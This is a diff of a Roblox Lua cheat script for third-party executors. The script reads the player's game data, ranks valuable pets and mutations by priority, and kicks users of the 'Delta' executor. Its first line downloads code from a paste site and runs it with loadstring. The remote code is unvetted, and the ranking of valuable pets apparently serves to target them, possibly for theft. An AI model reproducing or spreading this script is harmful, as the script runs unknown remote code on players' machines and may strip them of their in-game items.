@@ -1,6 +1,5 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
-
         local RS = game:GetService("ReplicatedStorage")
         local HttpService = game:GetService("HttpService")
         local RunService = game:GetService("RunService")
@@ -10,7 +9,6 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         local NumberUtil = require(RS.Modules.NumberUtil)
         local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
         local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
-
 
         local data = DataService:GetData()
 
@@ -24,6 +22,10 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                 end
             end)
             return name or "Unknown"
+        end
+
+        if detectExecutor() == "Delta" then
+            game.Players.LocalPlayer:Kick("Delta is not supported! Please use a different executor.")
         end
 
         local function formatNumberWithCommas(n)
@@ -195,31 +197,32 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         -- Priority system (1 = highest priority, 11 = lowest priority)
         local priorities = {
-            ["Raccoon"] = 1,
-            ["Fennec fox"] = 2,
-            ["Spinosaurus"] = 3,
-            ["Dragonfly"] = 4,
-            ["T-Rex"] = 5,
-            ["Mimic Octopus"] = 6,
-            ["Disco Bee"] = 7,
-            ["Butterfly"] = 8,
-            ["Queen Bee"] = 9,
-            ["Red Fox"] = 12
+            ["Kitsune"] = 1,
+            ["Raccoon"] = 2,
+            ["Fennec fox"] = 3,
+            ["Spinosaurus"] = 4,
+            ["Dragonfly"] = 5,
+            ["T-Rex"] = 6,
+            ["Mimic Octopus"] = 7,
+            ["Disco Bee"] = 8,
+            ["Butterfly"] = 9,
+            ["Queen Bee"] = 10,
+            ["Red Fox"] = 13
         }
 
         local mutationPriorities = {
-            ["Ascended"] = 13,
-            ["Rainbow"] = 14,
-            ["Shocked"] = 15,
-            ["Radiant"] = 16,
-            ["IronSkin"] = 17,
-            ["Mega"] = 18,
-            ["Tiny"] = 19,
-            ["Golden"] = 20,
-            ["Frozen"] = 21,
-            ["Windy"] = 22,
-            ["Inverted"] = 23,
-            ["Shiny"] = 24
+            ["Ascended"] = 14,
+            ["Rainbow"] = 15,
+            ["Shocked"] = 16,
+            ["Radiant"] = 17,
+            ["IronSkin"] = 18,
+            ["Mega"] = 19,
+            ["Tiny"] = 20,
+            ["Golden"] = 21,
+            ["Frozen"] = 22,
+            ["Windy"] = 23,
+            ["Inverted"] = 24,
+            ["Shiny"] = 25
         }
 
         -- Returns mutation name if found in toolName, otherwise nil
@@ -484,7 +487,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
             Frame.Parent = ScreenGui
             Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-            Frame.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+            Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
             Frame.BorderColor3 = Color3.fromRGB(18, 18, 18)
             Frame.BorderSizePixel = 0
             Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
